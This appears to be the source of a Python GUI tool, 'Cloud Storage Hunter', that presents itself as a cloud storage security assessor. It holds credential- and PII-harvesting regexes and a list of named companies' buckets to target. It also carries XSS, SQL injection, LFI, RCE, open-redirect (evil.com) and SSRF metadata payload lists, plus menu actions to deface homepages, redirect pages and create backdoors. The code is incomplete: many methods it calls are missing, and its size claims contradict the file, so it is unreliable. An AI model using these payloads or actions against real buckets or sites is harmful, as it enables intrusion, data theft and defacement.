#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     ██████╗██╗      ██████╗ ██╗   ██╗██████╗     ███████╗████████╗ ██████╗     ║
║    ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗    ██╔════╝╚══██╔══╝██╔═══██╗    ║
║    ██║     ██║     ██║   ██║██║   ██║██║  ██║    ███████╗   ██║   ██║   ██║    ║
║    ██║     ██║     ██║   ██║██║   ██║██║  ██║    ╚════██║   ██║   ██║   ██║    ║
║    ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝    ███████║   ██║   ╚██████╔╝    ║
║     ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝     ╚══════╝   ╚═╝    ╚═════╝     ║
║                                                                               ║
║              CLOUD STORAGE HUNTER v13.0 - ULTIMATE EDITION                    ║
║           Professional Cloud Storage Security Assessment Tool                 ║
║                             5000+ Lines of Code                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog, colorchooser, font
import requests
from requests.adapters import HTTPAdapter
import threading
import time
import json
import webbrowser
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import re
from datetime import datetime
import csv
import shutil
import mimetypes
import random
import string
import urllib.parse
from collections import defaultdict
import hashlib
import base64
import zipfile
import tarfile
import gzip
import io
from pathlib import Path
import queue
import pickle
import sqlite3
import subprocess
import sys
import platform
import socket
import ssl
import uuid
import secrets
from typing import Dict, List, Tuple, Optional, Any, Set
from dataclasses import dataclass, field, asdict
from enum import Enum
import logging
import traceback
import argparse
import configparser
import xml.etree.ElementTree as ET
from cryptography.fernet import Fernet
import dns.resolver

# ============================================================================
# CONFIGURATION & SETUP
# ============================================================================

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class Provider(Enum):
    AWS_S3 = "AWS S3"
    GOOGLE_GCS = "Google GCS"
    AZURE_BLOB = "Azure Blob"
    WASABI = "Wasabi"
    DIGITALOCEAN = "DigitalOcean Spaces"
    BACKBLAZE = "Backblaze B2"
    LINODE = "Linode Object Storage"
    VULTR = "Vultr Object Storage"
    ALIBABA = "Alibaba Cloud OSS"
    TENCENT = "Tencent Cloud COS"
    IBM = "IBM Cloud Object Storage"
    ORACLE = "Oracle Cloud Storage"
    RACKSPACE = "Rackspace Cloud Files"
    SCALEWAY = "Scaleway Object Storage"
    OVH = "OVH Cloud Storage"
    UPCLOUD = "UpCloud Object Storage"
    UNKNOWN = "Unknown"

class Permission(Enum):
    PUBLIC_READ = "Public Read"
    PUBLIC_WRITE = "Public Write"
    PUBLIC_LIST = "Public List"
    AUTHENTICATED_READ = "Authenticated Read"
    PRIVATE = "Private"
    UNKNOWN = "Unknown"

class FileType(Enum):
    TEXT = "Text"
    HTML = "HTML"
    JAVASCRIPT = "JavaScript"
    CSS = "CSS"
    JSON = "JSON"
    XML = "XML"
    IMAGE = "Image"
    VIDEO = "Video"
    AUDIO = "Audio"
    ARCHIVE = "Archive"
    EXECUTABLE = "Executable"
    DATABASE = "Database"
    CONFIG = "Configuration"
    LOG = "Log"
    BACKUP = "Backup"
    CERTIFICATE = "Certificate"
    KEY = "Key"
    ENV = "Environment"
    UNKNOWN = "Unknown"

@dataclass
class FileInfo:
    """Enhanced file information with all metadata"""
    name: str
    path: str
    size: int
    last_modified: str
    content_type: str
    etag: str = ""
    is_directory: bool = False
    permissions: List[str] = field(default_factory=list)
    credentials_found: List[Dict] = field(default_factory=list)
    urls_extracted: List[str] = field(default_factory=list)
    emails_extracted: List[str] = field(default_factory=list)
    ips_extracted: List[str] = field(default_factory=list)
    domains_extracted: List[str] = field(default_factory=list)
    hash_md5: str = ""
    hash_sha1: str = ""
    hash_sha256: str = ""
    file_type: FileType = FileType.UNKNOWN
    virus_total_score: Optional[int] = None
    is_encrypted: bool = False
    encryption_type: str = ""
    backup_of: str = ""
    contains_credentials: bool = False
    contains_pii: bool = False
    contains_secrets: bool = False

@dataclass
class BucketInfo:
    """Enhanced bucket information with complete details"""
    name: str
    provider: Provider
    url: str
    region: str = "us-east-1"
    files: List[FileInfo] = field(default_factory=list)
    total_files: int = 0
    total_size: int = 0
    is_public_read: bool = False
    is_public_write: bool = False
    is_public_list: bool = False
    is_authenticated_read: bool = False
    sensitive_files_count: int = 0
    credentials_found: int = 0
    pii_files_count: int = 0
    backup_files_count: int = 0
    config_files_count: int = 0
    log_files_count: int = 0
    website_enabled: bool = False
    website_endpoint: str = ""
    logging_enabled: bool = False
    versioning_enabled: bool = False
    encryption_enabled: bool = False
    encryption_type: str = ""
    created_date: str = ""
    owner: str = ""
    tags: Dict[str, str] = field(default_factory=dict)
    scan_timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    risk_score: int = 0
    risk_level: str = "Low"

@dataclass
class ScanJob:
    """Scan job information"""
    id: str
    target: str
    provider: Provider
    status: str
    start_time: str
    end_time: str = ""
    buckets_found: int = 0
    files_found: int = 0
    credentials_found: int = 0
    total_size: int = 0
    errors: List[str] = field(default_factory=list)

@dataclass
class ExploitResult:
    """Exploit test result"""
    bucket_name: str
    exploit_type: str
    success: bool
    details: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    proof_url: str = ""
    payload_used: str = ""

# ============================================================================
# CLOUD STORAGE HUNTER - MAIN APPLICATION
# ============================================================================

class CloudStorageHunter:
    """Professional Cloud Storage Security Assessment Tool - Ultimate Edition"""
    def open_settings(self):
        """Open settings dialog"""
        self.notebook.select(7)  # Switch to settings tab
        
    
    def load_settings(self):
        """Load settings from file"""
        settings_file = os.path.join(self.settings['results_dir'], 'settings.json')
        if os.path.exists(settings_file):
            try:
                with open(settings_file, 'r') as f:
                    loaded = json.load(f)
                    self.settings.update(loaded)
            except:
                pass
        
    VERSION = "13.0.0"
    BUILD_DATE = "2024"
    APP_NAME = "Cloud Storage Hunter"
    AUTHOR = "Security Research Team"
    
    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title(f"🔥 {self.APP_NAME} v{self.VERSION} - Ultimate Security Suite")
        self.root.geometry("1400x900")
        self.root.configure(bg='#0a0a0a')
        self.root.minsize(1200, 800)

        # Ensure window appears in front and centered (fix "app opens but not visible")
        self.root.update_idletasks()
        screen_w = self.root.winfo_screenwidth()
        screen_h = self.root.winfo_screenheight()
        win_w = 1400
        win_h = 900
        x = max((screen_w - win_w) // 2, 0)
        y = max((screen_h - win_h) // 2, 0)
        self.root.geometry(f"{win_w}x{win_h}+{x}+{y}")
        try:
            self.root.deiconify()
            self.root.lift()
            self.root.focus_force()
            self.root.attributes("-topmost", True)
            self.root.after(300, lambda: self.root.attributes("-topmost", False))
        except Exception:
            pass
        
        # ====================================================================
        # DATA STRUCTURES
        # ====================================================================
        self.buckets: List[BucketInfo] = []
        self.scan_jobs: List[ScanJob] = []
        self.exploit_results: List[ExploitResult] = []
        self.download_queue: queue.Queue = queue.Queue()
        self.scanning_active = False
        self.credential_scan_active = False
        self.credential_scan_stop_requested = False
        self.current_scan_thread = None
        self.current_exploit_thread = None
        self.executor = ThreadPoolExecutor(max_workers=100)
        self.scan_lock = threading.Lock()
        self.db_lock = threading.Lock()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': f'{self.APP_NAME}/{self.VERSION} (Security Tool; Authorized Testing Only)',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        
        # ====================================================================
        # SETTINGS
        # ====================================================================
        self.settings = {
            'timeout': 15,
            'max_threads': 50,
            'auto_save': True,
            'deep_scan': True,
            'test_write': True,
            'test_delete': True,
            'extract_credentials': True,
            'extract_urls': True,
            'extract_emails': True,
            'extract_ips': True,
            'calculate_hashes': True,
            'check_virustotal': False,
            'virus_total_api_key': '',
            'theme': 'dark',
            'results_dir': "cloud_storage_results",
            'max_file_size_mb': 100,
            'rate_limit_delay': 0.1,
            'max_retries': 3,
            'verify_ssl': True,
            'proxy_enabled': False,
            'proxy_url': '',
            'user_agent_rotation': False,
            'concurrent_scans': 5,
            'auto_report': True,
            'report_format': 'html',
            'notify_on_complete': True,
            'save_raw_responses': False,
            'max_depth': 10,
            'follow_redirects': True,
            'detect_ssrf': True,
            'detect_sqli': True,
            'detect_xss': True,
            'detect_lfi': True,
            'detect_rce': True,
            'detect_open_redirect': True,
        }

        # Align HTTP connection pool with configured concurrency
        self.configure_http_session_pool()
        
        # ====================================================================
        # SENSITIVE PATTERNS FOR CREDENTIAL DETECTION
        # ====================================================================
        self.sensitive_patterns = [
            # AWS
            (r'AKIA[0-9A-Z]{16}', 'AWS Access Key ID', 'critical'),
            (r'[A-Za-z0-9/+=]{40}', 'AWS Secret Access Key', 'critical'),
            (r'aws_access_key_id\s*=\s*["\']?([A-Z0-9]{20})', 'AWS Access Key (config)', 'critical'),
            (r'aws_secret_access_key\s*=\s*["\']?([A-Za-z0-9/+=]{40})', 'AWS Secret Key (config)', 'critical'),
            
            # Google
            (r'AIza[0-9A-Za-z\-_]{35}', 'Google API Key', 'critical'),
            (r'GOOG[0-9A-Z]{10,}', 'Google API Key', 'critical'),
            (r'ya29\.[0-9A-Za-z\-_]+', 'Google OAuth Token', 'critical'),
            (r'1/[0-9A-Za-z\-_]+', 'Google OAuth Token', 'critical'),
            
            # JWT
            (r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*', 'JWT Token', 'high'),
            
            # Private Keys
            (r'-----BEGIN RSA PRIVATE KEY-----', 'RSA Private Key', 'critical'),
            (r'-----BEGIN DSA PRIVATE KEY-----', 'DSA Private Key', 'critical'),
            (r'-----BEGIN EC PRIVATE KEY-----', 'EC Private Key', 'critical'),
            (r'-----BEGIN OPENSSH PRIVATE KEY-----', 'SSH Private Key', 'critical'),
            (r'-----BEGIN PGP PRIVATE KEY BLOCK-----', 'PGP Private Key', 'critical'),
            
            # Passwords
            (r'password["\s:=]+[^\s]{6,}', 'Password', 'high'),
            (r'passwd["\s:=]+[^\s]{6,}', 'Password', 'high'),
            (r'pwd["\s:=]+[^\s]{6,}', 'Password', 'high'),
            (r'secret["\s:=]+[^\s]{6,}', 'Secret', 'high'),
            (r'token["\s:=]+[A-Za-z0-9]{16,}', 'Token', 'high'),
            (r'api_key["\s:=]+[A-Za-z0-9]{16,}', 'API Key', 'high'),
            (r'apikey["\s:=]+[A-Za-z0-9]{16,}', 'API Key', 'high'),
            (r'apiSecret["\s:=]+[A-Za-z0-9]{16,}', 'API Secret', 'high'),
            
            # Database
            (r'mongodb://[^/\s]+', 'MongoDB URI', 'critical'),
            (r'mysql://[^/\s]+', 'MySQL URI', 'critical'),
            (r'postgresql://[^/\s]+', 'PostgreSQL URI', 'critical'),
            (r'redis://[^/\s]+', 'Redis URI', 'critical'),
            (r'sqlite:///[^\s]+', 'SQLite URI', 'medium'),
            (r'oracle://[^/\s]+', 'Oracle URI', 'critical'),
            (r'sqlserver://[^/\s]+', 'SQL Server URI', 'critical'),
            
            # Tokens
            (r'xox[baprs]-[0-9]{10,12}-[0-9]{12,13}', 'Slack Token', 'critical'),
            (r'gh[ops]_[A-Za-z0-9]{36}', 'GitHub Token', 'critical'),
            (r'glpat-[A-Za-z0-9\-_]{20}', 'GitLab Token', 'critical'),
            (r'bb-[A-Za-z0-9]{32}', 'Bitbucket Token', 'critical'),
            
            # Emails
            (r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', 'Email Address', 'low'),
            
            # IP Addresses
            (r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', 'IP Address', 'low'),
            
            # URLs
            (r'https?://[^\s<>"\'\)\]]+', 'URL', 'low'),
            
            # API Keys
            (r'Bearer\s+[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+', 'Bearer Token', 'high'),
            (r'Basic\s+[A-Za-z0-9+/=]+', 'Basic Auth', 'high'),
            
            # Environment Variables
            (r'DB_PASSWORD\s*=\s*[^\s]+', 'DB Password', 'critical'),
            (r'DB_USERNAME\s*=\s*[^\s]+', 'DB Username', 'medium'),
            (r'REDIS_PASSWORD\s*=\s*[^\s]+', 'Redis Password', 'critical'),
            (r'SECRET_KEY\s*=\s*[^\s]+', 'Secret Key', 'critical'),
            (r'ENCRYPTION_KEY\s*=\s*[^\s]+', 'Encryption Key', 'critical'),
            (r'SESSION_SECRET\s*=\s*[^\s]+', 'Session Secret', 'critical'),
            (r'COOKIE_SECRET\s*=\s*[^\s]+', 'Cookie Secret', 'critical'),
            (r'JWT_SECRET\s*=\s*[^\s]+', 'JWT Secret', 'critical'),
            
            # Cloud
            (r'azure_.*_key\s*=\s*[^\s]+', 'Azure Key', 'critical'),
            (r'azure_.*_connection_string\s*=\s*[^\s]+', 'Azure Connection String', 'critical'),
            (r'storage_account_key\s*=\s*[^\s]+', 'Storage Account Key', 'critical'),
            (r'GOOGLE_APPLICATION_CREDENTIALS', 'Google App Creds', 'critical'),
            
            # Webhooks
            (r'https?://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+', 'Discord Webhook', 'critical'),
            (r'https?://hooks\.slack\.com/services/[A-Za-z0-9]+/[A-Za-z0-9]+/[A-Za-z0-9]+', 'Slack Webhook', 'critical'),
            
            # Payment
            (r'sk_live_[A-Za-z0-9]{24}', 'Stripe Live Key', 'critical'),
            (r'sk_test_[A-Za-z0-9]{24}', 'Stripe Test Key', 'high'),
            (r'pk_live_[A-Za-z0-9]{24}', 'Stripe Public Key', 'medium'),
            
            # Social Media
            (r'[0-9]{15,16}', 'Credit Card Number', 'critical'),
            (r'\d{3}-\d{2}-\d{4}', 'SSN', 'critical'),
        ]
        
        # ====================================================================
        # KNOWN BUCKETS DATABASE
        # ====================================================================
        self.known_buckets = {
            "pubhtml5.com": ["online.pubhtml5.com", "static.pubhtml5.com", "pubhtml5.com", "cdn.pubhtml5.com", "assets.pubhtml5.com", "media.pubhtml5.com", "images.pubhtml5.com"],
            "golondrinas": ["golondrinas", "promo", "chats", "service1", "golondrinas-backup", "golondrinas-logs"],
            "arc": ["arc-Buckets", "arc-buckets", "arc-bucket", "arc", "arc-prod", "arc-dev"],
            "infobae": ["infobae-assets", "infobae-cdn", "infobae-media", "infobae-images", "infobae-static"],
            "clarin": ["clarin-assets", "clarin-cdn", "clarin-media", "clarin-static", "clarin-backup"],
            "lanacion": ["lanacion-assets", "lanacion-media", "lanacion-cdn", "lanacion-static"],
            "google": ["google-analytics", "google-tag-manager", "google-ads", "google-apis", "google-cloud"],
            "facebook": ["facebook-pixel", "facebook-sdk", "facebook-ads", "facebook-analytics"],
            "twitter": ["twitter-widget", "twitter-embed", "twitter-ads", "twitter-analytics"],
            "amazon": ["amazon-ads", "amazon-assets", "amazon-cdn", "amazon-media"],
            "microsoft": ["microsoft-ads", "microsoft-cdn", "microsoft-assets", "microsoft-static"],
            "apple": ["apple-assets", "apple-cdn", "apple-media", "apple-static"],
            "netflix": ["netflix-assets", "netflix-cdn", "netflix-media", "netflix-images"],
            "spotify": ["spotify-assets", "spotify-cdn", "spotify-media", "spotify-images"],
            "uber": ["uber-assets", "uber-cdn", "uber-media", "uber-static"],
            "airbnb": ["airbnb-assets", "airbnb-cdn", "airbnb-media", "airbnb-images"],
            "paypal": ["paypal-assets", "paypal-cdn", "paypal-media", "paypal-static"],
            "stripe": ["stripe-assets", "stripe-cdn", "stripe-media", "stripe-static"],
            "shopify": ["shopify-assets", "shopify-cdn", "shopify-media", "shopify-images"],
            "wordpress": ["wordpress-assets", "wordpress-cdn", "wordpress-media", "wordpress-static"],
        }
        
        # ====================================================================
        # EXPLOIT PAYLOADS
        # ====================================================================
        self.exploit_payloads = {
            'xss': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                '<body onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<input onfocus=alert("XSS") autofocus>',
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1 --",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL--",
                "' AND SLEEP(5)--",
                "1' AND '1'='1",
                "1' OR '1'='1'--",
                "admin' --",
            ],
            'lfi': [
                '../../../../etc/passwd',
                '../../../../windows/win.ini',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..\\..\\..\\..\\windows\\win.ini',
                '/etc/passwd',
                'C:\\windows\\win.ini',
            ],
            'rce': [
                '; ls',
                '| ls',
                '&& ls',
                '|| ls',
                '$(ls)',
                '`ls`',
                '; cat /etc/passwd',
                '| cat /etc/passwd',
            ],
            'open_redirect': [
                'https://evil.com',
                '//evil.com',
                '///evil.com',
                '\\evil.com',
                '/\\/evil.com',
                'https:evil.com',
                'https://google.com@evil.com',
            ],
            'ssrf': [
                'http://169.254.169.254/latest/meta-data/',
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://169.254.169.254/latest/user-data/',
                'http://127.0.0.1:8080/admin',
                'http://localhost:8080/admin',
                'file:///etc/passwd',
                'gopher://localhost:8080/_GET%20/admin',
            ],
        }
        
        # ====================================================================
        # INITIALIZATION
        # ====================================================================
        os.makedirs(self.settings['results_dir'], exist_ok=True)
        self.init_database()
        self.load_settings()
        
        # Colors
        self.colors = {
            'bg': '#0a0a0a',
            'fg': '#ffffff',
            'accent': '#00ff00',
            'warning': '#ffaa00',
            'danger': '#ff4444',
            'info': '#4488ff',
            'success': '#00cc44',
            'purple': '#aa44ff',
            'cyan': '#00ffff',
            'pink': '#ff69b4',
            'gold': '#ffd700',
            'yellow': '#ffff00',
            'red': '#ff0000',
            'orange': '#ff8800',
            'blue': '#0088ff',
            'lime': '#aaff00',
            'teal': '#00ccaa',
            'indigo': '#6600cc',
            'green': "#76ff69"            
        }
        
        # Setup UI
        self.setup_styles()
        self.setup_menu()
        self.setup_main_layout()
        self.setup_status_bar()
        self.setup_hotkeys()
        
        # Load data
        self.load_history()
        self.load_buckets_from_db()
        
        # Start background processes
        self.process_download_queue()
        self.start_auto_save()
        
        # Log startup
        self.log(f"{self.APP_NAME} v{self.VERSION} initialized successfully")
        self.log("Ready for security assessment - Authorized use only")
    
    # ========================================================================
    # DATABASE INITIALIZATION
    # ========================================================================
    
    def init_database(self):
        """Initialize SQLite database with all tables"""
        db_path = os.path.join(self.settings['results_dir'], 'cloud_storage.db')
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.cursor = self.conn.cursor()
        
        # Buckets table
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS buckets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                provider TEXT,
                url TEXT,
                region TEXT,
                total_files INTEGER,
                total_size INTEGER,
                is_public_read BOOLEAN,
                is_public_write BOOLEAN,
                is_public_list BOOLEAN,
                sensitive_files_count INTEGER,
                credentials_found INTEGER,
                website_enabled BOOLEAN,
                logging_enabled BOOLEAN,
                versioning_enabled BOOLEAN,
                encryption_enabled BOOLEAN,
                created_date TEXT,
                owner TEXT,
                risk_score INTEGER,
                risk_level TEXT,
                scan_timestamp TEXT
            )
        ''')
        
        # Files table
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bucket_id INTEGER,
                name TEXT,
                path TEXT,
                size INTEGER,
                last_modified TEXT,
                content_type TEXT,
                hash_md5 TEXT,
                hash_sha1 TEXT,
                hash_sha256 TEXT,
                file_type TEXT,
                contains_credentials BOOLEAN,
                contains_pii BOOLEAN,
                FOREIGN KEY (bucket_id) REFERENCES buckets (id)
            )
        ''')
        
        # Credentials table
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bucket_name TEXT,
                file_path TEXT,
                credential_type TEXT,
                credential_value TEXT,
                severity TEXT,
                found_timestamp TEXT,
                is_validated BOOLEAN DEFAULT 0
            )
        ''')
        
        # Scan jobs table
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_jobs (
                id TEXT PRIMARY KEY,
                target TEXT,
                provider TEXT,
                status TEXT,
                start_time TEXT,
                end_time TEXT,
                buckets_found INTEGER,
                files_found INTEGER,
                credentials_found INTEGER,
                total_size INTEGER
            )
        ''')
        
        # Exploits table
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS exploits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bucket_name TEXT,
                exploit_type TEXT,
                success BOOLEAN,
                details TEXT,
                timestamp TEXT,
                proof_url TEXT
            )
        ''')
        
        # Reports table
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS reports (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                report_type TEXT,
                generated_at TEXT,
                file_path TEXT,
                bucket_count INTEGER,
                file_count INTEGER,
                credential_count INTEGER
            )
        ''')

        # Backward-compatible schema migration for old databases
        self.ensure_db_schema()

        self.conn.commit()

    # ========================================================================
    # UI SETUP METHODS
    # ========================================================================
    
    def setup_styles(self):
        """Setup ttk styles with modern design"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure colors
        style.configure('Title.TLabel', font=('Segoe UI', 20, 'bold'), foreground=self.colors['accent'])
        style.configure('Heading.TLabel', font=('Segoe UI', 14, 'bold'), foreground=self.colors['info'])
        style.configure('Subheading.TLabel', font=('Segoe UI', 11), foreground=self.colors['fg'])
        
        # Button styles
        style.configure('Success.TButton', background=self.colors['success'], foreground='white', font=('Segoe UI', 10, 'bold'))
        style.configure('Danger.TButton', background=self.colors['danger'], foreground='white', font=('Segoe UI', 10, 'bold'))
        style.configure('Warning.TButton', background=self.colors['warning'], foreground='black', font=('Segoe UI', 10, 'bold'))
        style.configure('Primary.TButton', background=self.colors['info'], foreground='white', font=('Segoe UI', 10, 'bold'))
        style.configure('Accent.TButton', background=self.colors['accent'], foreground='black', font=('Segoe UI', 10, 'bold'))
        
        # Treeview style
        style.configure('Treeview', background=self.colors['bg'], foreground=self.colors['fg'], 
                       fieldbackground=self.colors['bg'], rowheight=25, font=('Segoe UI', 9))
        style.configure('Treeview.Heading', background='#1a1a1a', foreground=self.colors['fg'], 
                       font=('Segoe UI', 10, 'bold'))
        style.configure('Results.Treeview', background=self.colors['bg'], foreground=self.colors['fg'],
                       fieldbackground=self.colors['bg'], rowheight=25, font=('Segoe UI', 9))
        
        # Progressbar style
        style.configure('Accent.Horizontal.TProgressbar', background=self.colors['accent'], thickness=8)
        
        # Frame styles
        style.configure('Card.TFrame', background='#1a1a1a', relief=tk.RAISED, borderwidth=1)
        style.configure('Dark.TFrame', background=self.colors['bg'])
        
        # Label styles
        style.configure('Stats.TLabel', font=('Segoe UI', 24, 'bold'), foreground=self.colors['accent'])
        style.configure('StatsLabel.TLabel', font=('Segoe UI', 10), foreground=self.colors['fg'])
    
    def setup_menu(self):
        """Setup complete menu bar with all options"""
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # ===== File Menu =====
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="📁 File", menu=file_menu)
        file_menu.add_command(label="💾 Save Session", command=self.save_session, accelerator="Ctrl+S")
        file_menu.add_command(label="📂 Load Session", command=self.load_session, accelerator="Ctrl+O")
        file_menu.add_separator()
        file_menu.add_command(label="📊 Export All Data", command=self.export_all_data)
        file_menu.add_command(label="📄 Export Report", command=self.export_report)
        file_menu.add_command(label="📋 Export Credentials", command=self.export_credentials_to_file)
        file_menu.add_separator()
        file_menu.add_command(label="🗜️ Compress Results", command=self.compress_results)
        file_menu.add_command(label="🧹 Clean Results", command=self.clean_results)
        file_menu.add_separator()
        file_menu.add_command(label="⚙️ Settings", command=self.open_settings, accelerator="Ctrl+,")
        file_menu.add_separator()
        file_menu.add_command(label="❌ Exit", command=self.root.quit, accelerator="Ctrl+Q")
        
        # ===== Scan Menu =====
        scan_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="🔍 Scan", menu=scan_menu)
        scan_menu.add_command(label="🎯 Quick Scan", command=self.quick_scan)
        scan_menu.add_command(label="🚀 Full Scan", command=self.full_scan)
        scan_menu.add_command(label="📋 Batch Scan", command=self.open_batch_scanner)
        scan_menu.add_command(label="⚡ Deep Scan", command=self.deep_scan)
        scan_menu.add_separator()
        scan_menu.add_command(label="🌐 DNS Enumeration", command=self.open_dns_enum)
        scan_menu.add_command(label="🔑 Credential Scanner", command=self.open_credential_scanner)
        scan_menu.add_command(label="🌍 URL Extractor", command=self.open_url_extractor)
        scan_menu.add_command(label="📧 Email Extractor", command=self.open_email_extractor)
        
        # ===== Exploit Menu =====
        exploit_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="💣 Exploit", menu=exploit_menu)
        exploit_menu.add_command(label="🔐 Test Write Access", command=self.test_write_exploit)
        exploit_menu.add_command(label="🗑️ Test Delete Access", command=self.test_delete_exploit)
        exploit_menu.add_command(label="🌐 Test Website Hosting", command=self.test_website_hosting)
        exploit_menu.add_command(label="🎯 Test Bucket Takeover", command=self.test_bucket_takeover)
        exploit_menu.add_separator()
        exploit_menu.add_command(label="💉 XSS Injection", command=self.xss_injection)
        exploit_menu.add_command(label="🗄️ SQL Injection", command=self.sqli_test)
        exploit_menu.add_command(label="📁 LFI/RFI Test", command=self.lfi_test)
        exploit_menu.add_command(label="⚙️ RCE Test", command=self.rce_test)
        exploit_menu.add_separator()
        exploit_menu.add_command(label="📝 Deface Homepage", command=self.deface_homepage)
        exploit_menu.add_command(label="🔄 Redirect All Pages", command=self.redirect_all_pages)
        exploit_menu.add_command(label="💀 Create Backdoor", command=self.create_backdoor)
        
        # ===== Tools Menu =====
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="🛠️ Tools", menu=tools_menu)
        tools_menu.add_command(label="🔐 Hash Generator", command=self.open_hash_generator)
        tools_menu.add_command(label="📝 Base64 Tool", command=self.open_base64_tool)
        tools_menu.add_command(label="🌍 URL Encoder/Decoder", command=self.open_url_tool)
        tools_menu.add_command(label="📊 JSON Formatter", command=self.open_json_tool)
        tools_menu.add_command(label="🔍 Regex Tester", command=self.open_regex_tool)
        tools_menu.add_command(label="🔑 Password Generator", command=self.open_password_generator)
        tools_menu.add_separator()
        tools_menu.add_command(label="🔬 Port Scanner", command=self.open_port_scanner)
        tools_menu.add_command(label="🌐 Subdomain Scanner", command=self.open_subdomain_scanner)
        tools_menu.add_command(label="📡 Network Scanner", command=self.open_network_scanner)
        tools_menu.add_separator()
        tools_menu.add_command(label="🗜️ Compress Results", command=self.compress_results)
        tools_menu.add_command(label="💾 Backup Database", command=self.backup_database)
        
        # ===== Reports Menu =====
        reports_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="📈 Reports", menu=reports_menu)
        reports_menu.add_command(label="📊 HTML Report", command=lambda: self.generate_full_report())
        reports_menu.add_command(label="📄 PDF Report", command=self.generate_pdf_report)
        reports_menu.add_command(label="📋 JSON Export", command=self.export_json)
        reports_menu.add_command(label="📊 CSV Export", command=self.export_csv)
        reports_menu.add_command(label="📑 Executive Summary", command=self.generate_executive_summary)
        reports_menu.add_separator()
        reports_menu.add_command(label="🔐 Vulnerability Report", command=self.generate_vulnerability_report)
        reports_menu.add_command(label="🔑 Credentials Report", command=self.generate_credentials_report)
        
        # ===== Help Menu =====
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="❓ Help", menu=help_menu)
        help_menu.add_command(label="📖 Documentation", command=self.open_docs)
        help_menu.add_command(label="⌨️ Shortcuts", command=self.show_shortcuts)
        help_menu.add_command(label="ℹ️ About", command=self.show_about)
        help_menu.add_command(label="📝 License", command=self.show_license)
        help_menu.add_separator()
        help_menu.add_command(label="🐛 Report Bug", command=self.report_bug)
        help_menu.add_command(label="💡 Request Feature", command=self.request_feature)
    
    def setup_hotkeys(self):
        """Setup keyboard hotkeys"""
        # File operations
        self.root.bind('<Control-s>', lambda e: self.save_session())
        self.root.bind('<Control-o>', lambda e: self.load_session())
        self.root.bind('<Control-q>', lambda e: self.root.quit())
        self.root.bind('<Control-comma>', lambda e: self.open_settings())
        
        # View operations
        self.root.bind('<F5>', lambda e: self.refresh_current_view())
        self.root.bind('<F1>', lambda e: self.open_docs())
        self.root.bind('<F2>', lambda e: self.quick_scan())
        self.root.bind('<F3>', lambda e: self.full_scan())
        self.root.bind('<F4>', lambda e: self.open_file_manager())
        
        # Tab navigation
        self.root.bind('<Control-Tab>', lambda e: self.next_tab())
        self.root.bind('<Control-Shift-Tab>', lambda e: self.prev_tab())
        
        # Numbers 1-9 for tab switching
        for i in range(1, 10):
            self.root.bind(f'<Alt-{i}>', lambda e, idx=i-1: self.switch_to_tab(idx))
    
    def setup_main_layout(self):
        """Setup main layout with notebook and all tabs"""
        # Main container
        self.main_container = ttk.Frame(self.root, style='Dark.TFrame')
        self.main_container.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Notebook (Tabs)
        self.notebook = ttk.Notebook(self.main_container)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Create all tabs
        self.create_dashboard_tab()
        self.create_file_manager_tab()
        self.create_bucket_browser_tab()
        self.create_scan_tab()
        self.create_exploit_tab()
        self.create_results_tab()
        self.create_credential_tab()
        self.create_vulnerability_tab()
        self.create_tools_tab()
        self.create_reports_tab()
        self.create_history_tab()
        self.create_settings_tab()
